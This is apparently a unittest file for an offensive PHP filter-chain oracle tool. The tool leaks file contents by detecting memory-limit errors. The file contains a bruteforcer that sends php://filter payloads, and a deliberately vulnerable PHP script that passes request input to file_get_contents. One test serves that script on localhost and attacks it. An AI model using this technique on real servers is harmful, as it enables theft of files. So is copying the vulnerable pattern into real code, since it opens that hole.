# python -m unittest
import tempfile
from unittest import TestCase
import unittest
import subprocess
import base64

from core.bruteforcer import Bruteforcer


class TestBruteforcer(TestCase):
    B64_DIGITS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    BAS64_WORDS = ["cm9vdDp4", "MTI9LjAu", "ABCD", "////////"]

    def test_digit(self):
        for digit in self.B64_DIGITS:
            with self.subTest(digit=digit):
                resource = "data:text/plain;base64," + digit + "AAA"
                bruteforcer = PHPScriptBruteforcer(resource, 0)
                try:
                    base64, _ = next(iter(bruteforcer.bruteforce()))
                except StopIteration:
                    self.fail(f"No digit was returned, expected {digit!r}")

                if base64 != digit:
                    self.fail(
                        f"Base64 did not match: expected {digit!r}, got {base64!r}"
                    )

    def test_word(self):
        # Using data:// does not work; it is less resilient to errors than file://
        for b64_word in self.BAS64_WORDS:
            with self.subTest(word=b64_word):
                with tempfile.NamedTemporaryFile("wb") as file:
                    file.write(base64.b64decode(b64_word.encode()))
                    file.flush()
                    bruteforcer = PHPScriptBruteforcer(file.name, 0)
                    b64 = None
                    for i, (b64, _) in enumerate(bruteforcer.bruteforce()):
                        part = b64_word[: i + 1]
                        if b64 != part:
                            self.fail(
                                f"Base64 did not match: expected {part!r}, got {b64!r}"
                            )
                    self.assertEqual(b64, b64_word)
    
    def test_tool(self):
        temp_directory = tempfile.gettempdir()
        chain_to_leak = b"abcdefghijklmno"
        result = False
        with tempfile.NamedTemporaryFile("wb", suffix=".php") as php_file:
                php_file.write(b"<?php ini_set('memory_limit', '100000'); echo file_get_contents($_REQUEST[0]);;")
                php_file.flush()
                try:
                    with tempfile.NamedTemporaryFile("wb") as file_to_leak:
                        file_to_leak.write(chain_to_leak)
                        file_to_leak.flush()
                        php_server = subprocess.Popen(["php", "-S","127.0.0.1:42424", "-t", temp_directory], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        splitted_php_filename = php_file.name.split("/")[2]
                        with tempfile.NamedTemporaryFile("wb") as tmp_log_file:
                            filters_chain_oracle_exploit = subprocess.Popen(["python3","../filters_chain_oracle_exploit.py","--target", "http://127.0.0.1:42424/"+splitted_php_filename, "--file", file_to_leak.name, "--parameter", "0", "--delay", "0.05", "--log", tmp_log_file.name])
                            filters_chain_oracle_exploit.wait()
                            filters_chain_oracle_exploit.kill()
                            php_server.kill()
                            php_server.wait()
                            php_file.close()
                            file_to_leak.close()
                            with open(tmp_log_file.name) as f:
                                for line in f:
                                    if chain_to_leak.decode("utf-8") in str(line):
                                        result = True
                            tmp_log_file.close()
                except subprocess.CalledProcessError:
                    php_server.kill()
                    filters_chain_oracle_exploit.kill()
                    php_file.close()
                    tmp_log_file.close()
                    file_to_leak.close()
                    self.assertEqual(True, result)
        self.assertEqual(True, result)

class PHPScriptBruteforcer(Bruteforcer):
    """A bruteforcer that runs php with a memory limit of 2MB, and checks if the memory
    limit was reached.
    """

    PHP_BINARY = "php"
    PAYLOAD = """
ini_set('memory_limit', '2097152');
file_get_contents('{filter}');
"""

    def __init__(self, target: str, offset: int):
        self.target = target
        super().__init__(offset)

    def send(self, filter: str) -> bool:
        filter = f"php://filter/{filter}/resource={self.target}"
        payload = self.PAYLOAD.format(filter=filter)
        try:
            output = subprocess.check_output(
                (self.PHP_BINARY, "-r", payload), stderr=subprocess.PIPE
            )
        except subprocess.CalledProcessError:
            return True
        return b"Allowed memory size of " in output


if __name__ == "__main__":
    unittest.main()
